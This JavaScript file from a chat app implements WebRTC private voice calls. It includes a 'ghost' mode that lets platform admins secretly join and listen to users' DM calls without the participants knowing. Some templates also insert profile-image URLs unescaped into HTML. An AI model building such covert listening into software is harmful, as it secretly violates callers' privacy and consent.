// ══════════════════════════════════════════════════════════════════
// VOICE CALLS — persistent bar, P2P WebRTC, max 5 people
// ══════════════════════════════════════════════════════════════════
let vcallId = null;
let vcallParticipants = {};  // name → { pc, muted }
let vcallTimerInterval = null;
let vcallSeconds = 0;
let vcallLocalStream = null;
let vcallMuted = false;

// Ghost DM call state — admin silently listens to someone's voice call
let ghostVcallId = null;          // callId we're ghosting
let ghostVcallParticipants = {};  // name → RTCPeerConnection (receive-only)
let ghostVcallStream = null;      // local mic stream (starts muted)
let ghostVcallRevealed = false;

function showVcallBar(status) {
  const bar = document.getElementById('vcall-bar');
  bar.classList.add('active');
  document.getElementById('vcall-status').textContent = status || 'In call';
}

function hideVcallBar() {
  document.getElementById('vcall-bar').classList.remove('active');
  document.getElementById('vcall-invite-widget').style.display = 'none';
}

function renderVcallBar() {
  const members = document.getElementById('vcall-bar-members');
  const all = [S.user.name, ...Object.keys(vcallParticipants)];
  members.innerHTML = all.map(name => {
    const isSelf = name === S.user.name;
    const color = isSelf ? S.user.color : (profileCache[name]?.color || COLORS[hash(name) % COLORS.length]);
    const pfp = isSelf ? S.user.pfp : profileCache[name]?.pfp;
    const muted = isSelf ? vcallMuted : vcallParticipants[name]?.muted;
    const avContent = pfp ? `<img src="${pfp}">` : esc(name[0]?.toUpperCase() || '?');
    return `<div class="vcall-member-pip">
      <div class="vcall-pip-av" style="background:${pfp ? 'transparent' : color}">${avContent}</div>
      <span class="vcall-pip-nm">${esc(name)}${isSelf ? ' (you)' : ''}</span>
      ${muted ? '<span class="vcall-pip-muted">🔇</span>' : ''}
    </div>`;
  }).join('');
}

function startVcallTimer() {
  clearInterval(vcallTimerInterval);
  vcallSeconds = 0;
  vcallTimerInterval = setInterval(() => {
    vcallSeconds++;
    const mm = Math.floor(vcallSeconds / 60).toString().padStart(2, '0');
    const ss = (vcallSeconds % 60).toString().padStart(2, '0');
    document.getElementById('vcall-timer').textContent = mm + ':' + ss;
  }, 1000);
}

function showVcallInviteWidget() {
  const w = document.getElementById('vcall-invite-widget');
  const all = [S.user.name, ...Object.keys(vcallParticipants)];
  if (all.length >= 5) { toast('Max 5 people in a call'); return; }
  w.style.display = w.style.display === 'none' ? 'block' : 'none';
}

async function startVoiceCall(targetName) {
  try {
    vcallLocalStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
  } catch(e) {
    toast('🎤 Microphone access denied'); return;
  }
  vcallId = uid();
  vcallParticipants = {};
  vcallMuted = false;
  wsSend({ type: 'vcall_invite', callId: vcallId, to: targetName, from: S.user.name, fromColor: S.user.color, fromPfp: S.user.pfp || null });
  showVcallBar('Calling ' + targetName + '...');
  renderVcallBar();
  startVcallTimer();
  startWsPing();
  toast('📞 Calling ' + targetName + '...');
}

function vcallInvite() {
  const name = document.getElementById('vcall-invite-in').value.trim();
  if (!name) return;
  const all = [S.user.name, ...Object.keys(vcallParticipants)];
  if (all.length >= 5) { toast('Max 5 participants'); return; }
  if (all.includes(name)) { toast(name + ' is already in the call'); return; }
  wsSend({ type: 'vcall_invite', callId: vcallId, to: name, from: S.user.name, fromColor: S.user.color, fromPfp: S.user.pfp || null });
  document.getElementById('vcall-invite-in').value = '';
  document.getElementById('vcall-invite-widget').style.display = 'none';
  toast('📨 Invited ' + name);
}

function endVoiceCall() {
  if (vcallId) {
    const participants = Object.keys(vcallParticipants);
    wsSend({ type: 'vcall_end', callId: vcallId, from: S.user.name, to: participants });
  }
  cleanupVcall();
}

function cleanupVcall() {
  clearInterval(vcallTimerInterval); vcallTimerInterval = null; vcallSeconds = 0;
  Object.entries(vcallParticipants).forEach(([id, p]) => {
    clearTimeout(p.pc?._disconnectTimer);
    try { p.pc?.close(); } catch(e){}
    delete _vcallIceBuffer[id];
  });
  vcallParticipants = {};
  if (vcallLocalStream) { vcallLocalStream.getTracks().forEach(t => t.stop()); vcallLocalStream = null; }
  document.querySelectorAll('.vcall-audio-el').forEach(a => a.remove());
  vcallId = null; vcallMuted = false;
  document.getElementById('vcall-timer').textContent = '';
  hideVcallBar();
  stopWsPing();
}

function toggleVoiceCallMute() {
  vcallMuted = !vcallMuted;
  if (vcallLocalStream) vcallLocalStream.getAudioTracks().forEach(t => t.enabled = !vcallMuted);
  const btn = document.getElementById('vcall-mute-btn');
  if (btn) { btn.textContent = vcallMuted ? '🔇' : '🎙️'; btn.style.color = vcallMuted ? 'var(--red)' : 'var(--accent)'; }
  renderVcallBar();
}

// Override toggleVoiceMute to handle both voice channels and calls
function toggleVoiceMute() {
  if (vcallId) { toggleVoiceCallMute(); return; }
  if (!vcLocalStream) return;
  vcMuted = !vcMuted;
  vcLocalStream.getAudioTracks().forEach(t => t.enabled = !vcMuted);
  const btn = document.getElementById('voice-mute-btn');
  if (btn) { btn.style.color = vcMuted ? 'var(--red)' : 'var(--green)'; }
  toast(vcMuted ? '🔇 Muted' : '🎙️ Unmuted');
}

function recvVcallInvite(msg) {
  const from = msg.from;
  document.getElementById('vcall-incoming')?.remove();
  const div = document.createElement('div');
  div.id = 'vcall-incoming';
  div.style.cssText = 'position:fixed;bottom:80px;right:20px;background:var(--s2);border:1px solid var(--border2);border-radius:14px;padding:16px 18px;z-index:999;box-shadow:0 8px 40px rgba(0,0,0,.7);min-width:230px;animation:slideUp .2s ease';
  div.innerHTML = `
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
      <div style="width:36px;height:36px;border-radius:50%;background:${msg.fromColor||'var(--accent)'};display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff;overflow:hidden;flex-shrink:0">
        ${msg.fromPfp ? `<img src="${msg.fromPfp}" style="width:100%;height:100%;object-fit:cover">` : esc(from[0]?.toUpperCase()||'?')}
      </div>
      <div>
        <div style="font-size:13px;font-weight:700">📞 ${esc(from)}</div>
        <div style="font-size:11px;color:var(--t3)">Incoming voice call</div>
      </div>
    </div>
    <div style="display:flex;gap:8px">
      <button class="btn-p" style="flex:1;font-size:12px;background:#22c55e;border:none" onclick="acceptVcall('${esc(msg.callId)}','${esc(from)}')">Accept</button>
      <button class="btn-g" style="flex:1;font-size:12px;color:var(--red)" onclick="declineVcall('${esc(msg.callId)}','${esc(from)}')">Decline</button>
    </div>`;
  document.body.appendChild(div);
  // Auto-dismiss after 30s and show missed call notification
  const missedTimer = setTimeout(() => {
    if (div.parentNode) {
      div.remove();
      showMissedCall(from, msg.fromColor, msg.fromPfp);
    }
  }, 30000);
  div._missedTimer = missedTimer;
  addNotif('📞', from + ' is calling you!', () => acceptVcall(msg.callId, from));
  toast('📞 ' + from + ' is calling you!');
}

function showMissedCall(from, color, pfp) {
  addNotif('📵', 'Missed call from ' + from, () => openDMChat(from));
  // Persistent missed call banner
  document.getElementById('missed-call-banner')?.remove();
  const banner = document.createElement('div');
  banner.id = 'missed-call-banner';
  banner.style.cssText = 'position:fixed;top:60px;left:50%;transform:translateX(-50%);background:rgba(240,107,107,.12);border:1px solid rgba(240,107,107,.3);border-radius:10px;padding:8px 18px;z-index:998;display:flex;align-items:center;gap:10px;font-size:12px;font-weight:700;color:#f06b6b;cursor:pointer;animation:slideDown .2s ease';
  banner.innerHTML = `📵 Missed call from ${esc(from)} <span style="font-size:10px;font-weight:400;color:rgba(240,107,107,.7)">— click to reply</span> <span style="margin-left:8px;cursor:pointer;color:var(--t3)" onclick="event.stopPropagation();document.getElementById('missed-call-banner').remove()">✕</span>`;
  banner.onclick = () => { openDMChat(from); banner.remove(); };
  document.body.appendChild(banner);
  setTimeout(() => { if (banner.parentNode) banner.remove(); }, 20000);
}

async function acceptVcall(callId, from) {
  const incoming = document.getElementById('vcall-incoming');
  if (incoming?._missedTimer) clearTimeout(incoming._missedTimer);
  incoming?.remove();
  try {
    vcallLocalStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
  } catch(e) { toast('🎤 Mic denied'); return; }
  vcallId = callId;
  vcallMuted = false;
  vcallSeconds = 0;
  // Send accept first so caller knows we're joining
  wsSend({ type: 'vcall_accept', callId, to: from, from: S.user.name });
  // Callee is the one who initiates the WebRTC offer
  const pc = vcallCreatePeer(from);
  vcallParticipants[from] = { pc, muted: false };
  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  wsSend({ type: 'vcall_signal', callId, from: S.user.name, to: from, signal: { sdp: offer } });
  showVcallBar('In call with ' + from);
  renderVcallBar();
  startVcallTimer();
  startWsPing(); // keep WS alive during call
}

function declineVcall(callId, from) {
  const incoming = document.getElementById('vcall-incoming');
  if (incoming?._missedTimer) clearTimeout(incoming._missedTimer);
  incoming?.remove();
  wsSend({ type: 'vcall_decline', callId, to: from, from: S.user.name });
}

function recvVcallAccept(msg) {
  const from = msg.from;
  if (!vcallId || vcallId !== msg.callId) return;
  // Caller side: peer will be created when we receive the offer signal from callee.
  // Just update the UI to show the call is connecting.
  document.getElementById('vcall-status').textContent = 'Connecting…';
  renderVcallBar();
  toast('✅ ' + from + ' accepted — connecting…');
}

function recvVcallDecline(msg) {
  toast('❌ ' + msg.from + ' declined the call');
  // If nobody else in call, clean up
  if (Object.keys(vcallParticipants).length === 0) cleanupVcall();
  else renderVcallBar();
}

function recvVcallEnd(msg) {
  if (msg.callId !== vcallId) return;
  toast('📵 ' + (msg.from || 'Other person') + ' ended the call');
  cleanupVcall();
}

function vcallCreatePeer(peerId) {
  const pc = new RTCPeerConnection(RTC_CONFIG);
  if (vcallLocalStream) vcallLocalStream.getTracks().forEach(t => pc.addTrack(t, vcallLocalStream));
  pc.onicecandidate = e => {
    if (e.candidate) wsSend({ type: 'vcall_signal', callId: vcallId, from: S.user.name, to: peerId, signal: { ice: e.candidate } });
  };
  pc.ontrack = e => {
    let audio = document.getElementById('vcall-audio-' + peerId);
    if (!audio) {
      audio = document.createElement('audio');
      audio.id = 'vcall-audio-' + peerId;
      audio.className = 'vcall-audio-el';
      audio.autoplay = true;
      document.body.appendChild(audio);
    }
    audio.srcObject = e.streams[0];
    renderVcallBar();
  };
  // 'disconnected' is transient — network blip, switching WiFi. Don't tear down.
  // 'failed' is terminal — ICE gave up. Attempt a restart once before giving up.
  // 'closed' means the PC was explicitly closed.
  let _iceRestartAttempted = false;
  pc.onconnectionstatechange = () => {
    dbg(`vcall peer ${peerId}: ${pc.connectionState}`, pc.connectionState === 'connected' ? 'ok' : pc.connectionState === 'disconnected' ? 'warn' : 'info');
    if (pc.connectionState === 'disconnected') {
      // Give it 8 seconds to self-recover before we attempt a restart
      pc._disconnectTimer = setTimeout(async () => {
        if (pc.connectionState !== 'connected' && !_iceRestartAttempted) {
          _iceRestartAttempted = true;
          try {
            const offer = await pc.createOffer({ iceRestart: true });
            await pc.setLocalDescription(offer);
            wsSend({ type: 'vcall_signal', callId: vcallId, from: S.user.name, to: peerId, signal: { sdp: offer } });
            dbg(`vcall ICE restart sent to ${peerId}`, 'warn');
          } catch(e) { dbg('ICE restart failed: ' + e, 'err'); }
        }
      }, 8000);
    } else {
      clearTimeout(pc._disconnectTimer);
    }
    if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
      clearTimeout(pc._disconnectTimer);
      delete vcallParticipants[peerId];
      document.getElementById('vcall-audio-' + peerId)?.remove();
      if (Object.keys(vcallParticipants).length === 0) cleanupVcall();
      else renderVcallBar();
    }
  };
  pc.oniceconnectionstatechange = () => {
    dbg(`vcall ICE ${peerId}: ${pc.iceConnectionState}`, 'info');
  };
  return pc;
}

let _wsPingInterval = null;
function startWsPing() {
  clearInterval(_wsPingInterval);
  _wsPingInterval = setInterval(() => {
    if (S.wsOk) wsSend({ type: 'ping', ts: Date.now() });
  }, 20000);
}
function stopWsPing() {
  clearInterval(_wsPingInterval);
  _wsPingInterval = null;
}
// Buffering them prevents the silent "no audio" failure caused by the race.
const _vcallIceBuffer = {}; // peerId → RTCIceCandidate[]

async function handleVcallSignal(msg) {
  const peerId = msg.from;
  if (msg.callId !== vcallId) return; // stale signal from old call

  if (!vcallParticipants[peerId]) {
    const pc = vcallCreatePeer(peerId);
    vcallParticipants[peerId] = { pc, muted: false };
    _vcallIceBuffer[peerId] = [];
  }
  const pc = vcallParticipants[peerId].pc;

  if (msg.signal.sdp) {
    const sdp = msg.signal.sdp;
    if (sdp.type === 'offer') {
      await pc.setRemoteDescription(new RTCSessionDescription(sdp));
      // Drain any buffered ICE candidates now that we have remote desc
      for (const c of (_vcallIceBuffer[peerId] || [])) {
        try { await pc.addIceCandidate(c); } catch(e) {}
      }
      _vcallIceBuffer[peerId] = [];
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      wsSend({ type: 'vcall_signal', callId: vcallId, from: S.user.name, to: peerId, signal: { sdp: answer } });
      document.getElementById('vcall-status').textContent = 'In call';
      renderVcallBar();
    } else if (sdp.type === 'answer') {
      await pc.setRemoteDescription(new RTCSessionDescription(sdp));
      // Drain buffered ICE candidates
      for (const c of (_vcallIceBuffer[peerId] || [])) {
        try { await pc.addIceCandidate(c); } catch(e) {}
      }
      _vcallIceBuffer[peerId] = [];
      document.getElementById('vcall-status').textContent = 'In call';
      renderVcallBar();
    }
  } else if (msg.signal.ice) {
    const candidate = new RTCIceCandidate(msg.signal.ice);
    if (pc.remoteDescription) {
      try { await pc.addIceCandidate(candidate); } catch(e) {}
    } else {
      // Buffer it — remote description not set yet
      if (!_vcallIceBuffer[peerId]) _vcallIceBuffer[peerId] = [];
      _vcallIceBuffer[peerId].push(candidate);
    }
  }
}

// ── Ghost DM Call ────────────────────────────────────────────────────────────
// Admin joins a DM voice call silently — muted, invisible. Can reveal later.

async function ghostJoinVcall(callId) {
  if (!isPlatformPower()) { toast('No permission'); return; }
  if (ghostVcallId) leaveGhostVcall();
  try {
    ghostVcallStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    ghostVcallStream.getAudioTracks().forEach(t => t.enabled = false); // start muted
  } catch(e) {
    toast('🎤 Mic access required even for ghost calls'); return;
  }
  ghostVcallId = callId;
  ghostVcallRevealed = false;
  ghostVcallParticipants = {};
  wsSend({ type: 'admin_vcall_ghost_join', callId });
  toast('👻 Ghost joining call…');
}

function handleGhostVcallAck(msg) {
  // Server confirmed ghost join, gave us participant list
  // Initiate WebRTC with each participant (receive-only until reveal)
  const participants = msg.participants || [];
  participants.forEach(async (peerId) => {
    const pc = ghostVcallCreatePeer(peerId);
    ghostVcallParticipants[peerId] = pc;
    // Create offer to establish the connection
    const offer = await pc.createOffer({ offerToReceiveAudio: true });
    await pc.setLocalDescription(offer);
    wsSend({ type: 'vcall_signal', callId: ghostVcallId, from: S.user.name, to: peerId, signal: { sdp: offer } });
  });
  renderGhostVcallBar(participants);
  toast(`👻 Ghost listening to call (${participants.length} participant${participants.length !== 1 ? 's' : ''})`);
}

function ghostVcallCreatePeer(peerId) {
  const pc = new RTCPeerConnection(RTC_CONFIG);
  // Add mic tracks (muted by default) so we can later unmute on reveal
  if (ghostVcallStream) ghostVcallStream.getTracks().forEach(t => pc.addTrack(t, ghostVcallStream));
  pc.onicecandidate = e => {
    if (e.candidate) wsSend({ type: 'vcall_signal', callId: ghostVcallId, from: S.user.name, to: peerId, signal: { ice: e.candidate } });
  };
  pc.ontrack = e => {
    let audio = document.getElementById('ghost-vcall-audio-' + peerId);
    if (!audio) {
      audio = document.createElement('audio');
      audio.id = 'ghost-vcall-audio-' + peerId;
      audio.autoplay = true;
      document.body.appendChild(audio);
    }
    audio.srcObject = e.streams[0];
  };
  pc.onconnectionstatechange = () => {
    if (['disconnected','failed','closed'].includes(pc.connectionState)) {
      delete ghostVcallParticipants[peerId];
      document.getElementById('ghost-vcall-audio-' + peerId)?.remove();
      renderGhostVcallBar(Object.keys(ghostVcallParticipants));
      if (Object.keys(ghostVcallParticipants).length === 0) {
        toast('👻 Everyone left the call');
      }
    }
  };
  return pc;
}

async function handleGhostVcallSignal(msg) {
  // A call participant sent us a WebRTC signal (in response to our offer)
  const peerId = msg.from;
  if (!ghostVcallParticipants[peerId]) {
    const pc = ghostVcallCreatePeer(peerId);
    ghostVcallParticipants[peerId] = pc;
  }
  const pc = ghostVcallParticipants[peerId];
  if (msg.signal.sdp) {
    const sdp = msg.signal.sdp;
    if (sdp.type === 'offer') {
      await pc.setRemoteDescription(new RTCSessionDescription(sdp));
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      wsSend({ type: 'vcall_signal', callId: ghostVcallId, from: S.user.name, to: peerId, signal: { sdp: answer } });
    } else if (sdp.type === 'answer') {
      await pc.setRemoteDescription(new RTCSessionDescription(sdp));
    }
  } else if (msg.signal.ice) {
    try { await pc.addIceCandidate(new RTCIceCandidate(msg.signal.ice)); } catch(e) {}
  }
}

function ghostRevealVcall() {
  if (!ghostVcallId || ghostVcallRevealed) return;
  ghostVcallRevealed = true;
  // Unmute mic tracks across all peer connections
  if (ghostVcallStream) ghostVcallStream.getAudioTracks().forEach(t => t.enabled = true);
  // Tell server to broadcast vcall_accept to all participants so they see us
  wsSend({ type: 'admin_vcall_ghost_reveal', callId: ghostVcallId });
  // Migrate ghost state into normal vcall state so the regular call bar appears
  vcallId = ghostVcallId;
  vcallLocalStream = ghostVcallStream;
  vcallMuted = false;
  vcallParticipants = {};
  Object.entries(ghostVcallParticipants).forEach(([name, pc]) => {
    vcallParticipants[name] = { pc, muted: false };
  });
  // Clear ghost state (don't clean up the connections — they're now owned by vcall)
  ghostVcallId = null;
  ghostVcallParticipants = {};
  ghostVcallStream = null;
  document.getElementById('ghost-vcall-bar')?.remove();
  showVcallBar('In call');
  renderVcallBar();
  startVcallTimer();
  toast('🎙️ You are now visible in the call');
}

function leaveGhostVcall() {
  if (!ghostVcallId) return;
  Object.values(ghostVcallParticipants).forEach(pc => { try { pc.close(); } catch {} });
  document.querySelectorAll('[id^="ghost-vcall-audio-"]').forEach(a => a.remove());
  if (ghostVcallStream) { ghostVcallStream.getTracks().forEach(t => t.stop()); ghostVcallStream = null; }
  ghostVcallId = null;
  ghostVcallParticipants = {};
  ghostVcallRevealed = false;
  document.getElementById('ghost-vcall-bar')?.remove();
  toast('👻 Left ghost call');
}

function renderGhostVcallBar(participants) {
  let bar = document.getElementById('ghost-vcall-bar');
  if (!bar) {
    bar = document.createElement('div');
    bar.id = 'ghost-vcall-bar';
    bar.style.cssText = 'position:fixed;bottom:0;left:56px;right:200px;z-index:90;background:rgba(168,85,247,.08);border-top:1px solid rgba(168,85,247,.2);padding:8px 16px;display:flex;align-items:center;gap:12px;animation:slideUp .2s ease';
    document.body.appendChild(bar);
  }
  const pips = (participants || []).map(n =>
    `<span style="background:var(--s3);border:1px solid var(--border);border-radius:99px;padding:2px 9px;font-size:11px">${esc(n)}</span>`
  ).join('') || '<span style="font-size:11px;color:var(--t3)">No one else yet</span>';
  bar.innerHTML = `
    <div style="font-size:18px;animation:blink 1.5s infinite">👻</div>
    <div style="flex:1;min-width:0">
      <div style="font-size:11px;font-weight:700;color:#c084fc;margin-bottom:3px">GHOST LISTENING · ${participants.length} in call</div>
      <div style="display:flex;gap:4px;flex-wrap:wrap">${pips}</div>
    </div>
    <button onclick="ghostRevealVcall()" style="background:rgba(88,101,242,.2);border:1px solid rgba(88,101,242,.4);border-radius:7px;color:var(--accent);padding:6px 14px;font-size:11px;cursor:pointer;font-weight:700;flex-shrink:0">🎙️ Reveal &amp; Unmute</button>
    <button onclick="leaveGhostVcall()" style="background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.3);border-radius:7px;color:#f87171;padding:6px 10px;font-size:11px;cursor:pointer;flex-shrink:0">Leave</button>
  `;
}

function adminListCalls() { wsSend({ type: 'admin_list_calls' }); }

// Auto-request all stripped videos visible in current channel
function autoRequestStrippedVideos(chId) {
  if (!chId) return;
  setTimeout(() => {
    document.querySelectorAll('.vid-placeholder').forEach(el => {
      const msgId = el.dataset.msgId;
      const elChId = el.dataset.chId;
      if (!msgId || _pendingVideoRequests.has(msgId)) return;
      requestVideo(msgId, elChId || chId, el.dataset.name || '');
    });
  }, 600); // slight delay so DOM is settled
}

function requestVideo(msgId, channelId, name) {
  const el = document.querySelector(`[data-msg-id="${msgId}"].vid-placeholder`);
  if (el) {
    el.innerHTML = `<span style="font-size:20px;animation:blink 1s infinite">⏳</span><div style="font-size:12px;color:var(--t3);margin-left:8px">Requesting from peers…</div>`;
  }
  // Track this as pending so we ignore duplicate serves
  _pendingVideoRequests.add(msgId);
  wsSend({ type: 'video_request', msgId, channelId, requester: S.user.name, serverId: S.curSv?.id });
  // If nobody responds in 8s, show error
  setTimeout(() => {
    _pendingVideoRequests.delete(msgId);
    const still = document.querySelector(`[data-msg-id="${msgId}"].vid-placeholder`);
    if (still) still.innerHTML = `<span style="font-size:20px">🎬</span><div style="margin-left:10px"><div style="font-size:12px;font-weight:700;color:var(--t2)">${esc(name)}</div><div style="font-size:10px;color:var(--red);margin-top:2px">No one online has this video cached</div></div>`;
  }, 8000);
}
function migrateServers() {
  S.servers.forEach(sv => {
    // Only assign ownerId to self if there's genuinely no owner recorded at all
    // AND isOwner was explicitly set true (meaning we created it locally)
    if (!sv.ownerId && sv.isOwner === true) sv.ownerId = S.user.name;
    if (!sv.memberRoles) sv.memberRoles = {};
    if (!sv.roles) sv.roles = [];
    if (!sv.banned) sv.banned = [];
  });
}

function ppDM(name) {
  openOrCreateDM(name, profileCache[name]?.pfp || null);
}

function ppAddFriend(name) { sendFriendReqTo(name); }
function ppCall(name) { startVoiceCall(name); }
